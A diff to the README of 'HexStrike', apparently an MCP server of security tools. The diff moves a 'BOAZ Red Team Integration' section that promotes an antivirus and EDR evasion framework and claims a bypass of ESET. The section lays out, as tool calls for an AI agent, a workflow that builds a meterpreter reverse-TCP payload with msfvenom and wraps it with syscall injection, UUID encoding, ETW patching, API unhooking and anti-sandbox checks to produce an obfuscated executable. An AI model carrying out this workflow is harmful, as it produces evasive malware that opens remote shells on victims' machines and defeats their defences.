@@ -241,6 +241,128 @@ Configure VS Code settings in `.vscode/settings.json`:
 
 ---
 
+## 🔥 BOAZ Red Team Integration
+
+HexStrike now includes **BOAZ**, an advanced payload evasion framework for red team operations:
+
+### BOAZ Features
+
+- **77+ Process Injection Loaders** - Syscall, stealth, memory guard, threadless, and VEH/VCH techniques
+- **12 Encoding Schemes** - AES, ChaCha20, UUID, XOR, MAC, RC4, and more
+- **EDR/AV Evasion** - API unhooking, ETW patching, LLVM obfuscation (Akira/Pluto)
+- **Anti-Analysis** - Anti-emulation checks, sleep obfuscation, entropy reduction
+- **Binary Analysis** - Entropy analysis and optimization for heuristic evasion
+
+### BOAZ Capabilities in Action
+
+<div align="center">
+
+#### EDR/AV Bypass Demonstration
+**BOAZ-generated payload successfully bypassing ESET Smart Security Premium**
+
+<img src="assets/EDRbypass.png" alt="BOAZ EDR Bypass" width="800"/>
+
+*Payload with stealth injection techniques evading real-time protection and maintaining low detection profile*
+
+---
+
+#### MSFVenom Payload Obfuscation
+**Complete workflow: MSFVenom generation → BOAZ evasion → Enterprise-grade stealth payload**
+
+<img src="assets/Hex-Boaz.png" alt="BOAZ MSFVenom Obfuscation" width="900"/>
+
+*Demonstrates BOAZ transforming standard MSFVenom payloads into sophisticated evasive binaries with:*
+- **Loader #16** (Standard stealth injection)
+- **UUID Encoding** (Low entropy, legitimate-looking format)
+- **ETW Bypass** (Event Tracing for Windows patching)
+- **Anti-Emulation** (Sandbox detection)
+- **Entropy: 6.06/8** (Excellent for bypassing heuristic analysis)
+
+</div>
+
+---
+
+### BOAZ MCP Tools
+
+**Critical Workflow** (files MUST be in BOAZ_beta directory):
+
+```python
+# STEP 1: Ask user what type of evasion they need
+# User: "I need to bypass EDR userland hooks"
+
+# STEP 2: List syscall loaders (bypass EDR hooks)
+boaz_list_loaders(category="syscall")
+# Returns loaders 1-11 with direct syscall techniques
+
+# STEP 3: Generate initial payload with MSFVenom
+msfvenom_scan(
+    payload="windows/x64/meterpreter/reverse_tcp",
+    lhost="192.168.1.100",
+    lport=4444,
+    output="payload.exe"  # Creates payload.exe
+)
+
+# STEP 4: Move payload to BOAZ_beta directory (REQUIRED!)
+# Run this manually: cp payload.exe BOAZ_beta/
+
+# STEP 5: Apply BOAZ evasion with appropriate loader
+result = boaz_generate_payload(
+    input_file="payload.exe",          # File inside BOAZ_beta/
+    output_file="output/evasive.exe",  # Will be in BOAZ_beta/output/
+    loader=3,                           # Sifu Syscall (direct syscall)
+    encoding="uuid",                    # UUID encoding
+    anti_emulation=True,                # Evade sandboxes
+    etw=True,                           # ETW patching
+    api_unhooking=True,                 # API unhooking
+    sleep=True                          # Sleep evasion
+)
+
+# STEP 6: Check if compilation succeeded
+# If result['success'] == False, try a different loader from the same category
+# Result: BOAZ_beta/output/evasive.exe (~500KB, heavily obfuscated)
+```
+
+**Other BOAZ Tools:**
+
+```python
+# List available loaders by category
+boaz_list_loaders(category="stealth")
+
+# Analyze binary entropy
+boaz_analyze_binary(file_path="payload.exe")  # Must be in BOAZ_beta/
+
+# List encoding schemes
+boaz_list_encoders()
+
+# Validate configuration
+boaz_validate_options(loader=16, encoding="uuid")
+```
+
+**Important Notes:**
+- Choose loader based on evasion requirements, not reliability
+- Some loaders may fail compilation with newer mingw - try alternatives
+- Use `boaz_list_loaders(category="...")` to browse loaders by technique
+- ALL file paths are relative to BOAZ_beta directory
+- Input files MUST be inside BOAZ_beta/ (security requirement)
+- Output files go to BOAZ_beta/output/
+- Check `result['success']` after generation to verify compilation
+
+### Loader Categories
+
+| Category | Count | Description |
+|----------|-------|-------------|
+| **Syscall** | 11 | Direct syscalls to bypass userland hooks |
+| **Stealth** | 17 | Advanced memory scan evasion techniques |
+| **Memory Guard** | 6 | Breakpoint handlers and ROP trampolines |
+| **Threadless** | 6 | Module stomping and VT pointer injection |
+| **VEH/VCH** | 5 | Exception handler-based injection |
+| **Userland** | 4 | Standard Windows API injection |
+
+**Credits**: BOAZ Framework by [thomasxm/Boaz_beta](https://github.com/thomasxm/Boaz_beta)
+
+---
+
+
 ## Features
 
 ### Security Tools Arsenal
@@ -518,126 +640,6 @@ Configure VS Code settings in `.vscode/settings.json`:
 
 ---
 
-## 🔥 BOAZ Red Team Integration
-
-HexStrike now includes **BOAZ**, an advanced payload evasion framework for red team operations:
-
-### BOAZ Features
-
-- **77+ Process Injection Loaders** - Syscall, stealth, memory guard, threadless, and VEH/VCH techniques
-- **12 Encoding Schemes** - AES, ChaCha20, UUID, XOR, MAC, RC4, and more
-- **EDR/AV Evasion** - API unhooking, ETW patching, LLVM obfuscation (Akira/Pluto)
-- **Anti-Analysis** - Anti-emulation checks, sleep obfuscation, entropy reduction
-- **Binary Analysis** - Entropy analysis and optimization for heuristic evasion
-
-### BOAZ Capabilities in Action
-
-<div align="center">
-
-#### EDR/AV Bypass Demonstration
-**BOAZ-generated payload successfully bypassing ESET Smart Security Premium**
-
-<img src="assets/EDRbypass.png" alt="BOAZ EDR Bypass" width="800"/>
-
-*Payload with stealth injection techniques evading real-time protection and maintaining low detection profile*
-
----
-
-#### MSFVenom Payload Obfuscation
-**Complete workflow: MSFVenom generation → BOAZ evasion → Enterprise-grade stealth payload**
-
-<img src="assets/Hex-Boaz.png" alt="BOAZ MSFVenom Obfuscation" width="900"/>
-
-*Demonstrates BOAZ transforming standard MSFVenom payloads into sophisticated evasive binaries with:*
-- **Loader #16** (Standard stealth injection)
-- **UUID Encoding** (Low entropy, legitimate-looking format)
-- **ETW Bypass** (Event Tracing for Windows patching)
-- **Anti-Emulation** (Sandbox detection)
-- **Entropy: 6.06/8** (Excellent for bypassing heuristic analysis)
-
-</div>
-
----
-
-### BOAZ MCP Tools
-
-**Critical Workflow** (files MUST be in BOAZ_beta directory):
-
-```python
-# STEP 1: Ask user what type of evasion they need
-# User: "I need to bypass EDR userland hooks"
-
-# STEP 2: List syscall loaders (bypass EDR hooks)
-boaz_list_loaders(category="syscall")
-# Returns loaders 1-11 with direct syscall techniques
-
-# STEP 3: Generate initial payload with MSFVenom
-msfvenom_scan(
-    payload="windows/x64/meterpreter/reverse_tcp",
-    lhost="192.168.1.100",
-    lport=4444,
-    output="payload.exe"  # Creates payload.exe
-)
-
-# STEP 4: Move payload to BOAZ_beta directory (REQUIRED!)
-# Run this manually: cp payload.exe BOAZ_beta/
-
-# STEP 5: Apply BOAZ evasion with appropriate loader
-result = boaz_generate_payload(
-    input_file="payload.exe",          # File inside BOAZ_beta/
-    output_file="output/evasive.exe",  # Will be in BOAZ_beta/output/
-    loader=3,                           # Sifu Syscall (direct syscall)
-    encoding="uuid",                    # UUID encoding
-    anti_emulation=True,                # Evade sandboxes
-    etw=True,                           # ETW patching
-    api_unhooking=True,                 # API unhooking
-    sleep=True                          # Sleep evasion
-)
-
-# STEP 6: Check if compilation succeeded
-# If result['success'] == False, try a different loader from the same category
-# Result: BOAZ_beta/output/evasive.exe (~500KB, heavily obfuscated)
-```
-
-**Other BOAZ Tools:**
-
-```python
-# List available loaders by category
-boaz_list_loaders(category="stealth")
-
-# Analyze binary entropy
-boaz_analyze_binary(file_path="payload.exe")  # Must be in BOAZ_beta/
-
-# List encoding schemes
-boaz_list_encoders()
-
-# Validate configuration
-boaz_validate_options(loader=16, encoding="uuid")
-```
-
-**Important Notes:**
-- Choose loader based on evasion requirements, not reliability
-- Some loaders may fail compilation with newer mingw - try alternatives
-- Use `boaz_list_loaders(category="...")` to browse loaders by technique
-- ALL file paths are relative to BOAZ_beta directory
-- Input files MUST be inside BOAZ_beta/ (security requirement)
-- Output files go to BOAZ_beta/output/
-- Check `result['success']` after generation to verify compilation
-
-### Loader Categories
-
-| Category | Count | Description |
-|----------|-------|-------------|
-| **Syscall** | 11 | Direct syscalls to bypass userland hooks |
-| **Stealth** | 17 | Advanced memory scan evasion techniques |
-| **Memory Guard** | 6 | Breakpoint handlers and ROP trampolines |
-| **Threadless** | 6 | Module stomping and VT pointer injection |
-| **VEH/VCH** | 5 | Exception handler-based injection |
-| **Userland** | 4 | Standard Windows API injection |
-
-**Credits**: BOAZ Framework by [thomasxm/Boaz_beta](https://github.com/thomasxm/Boaz_beta)
-
----
 
 ## API Reference
 
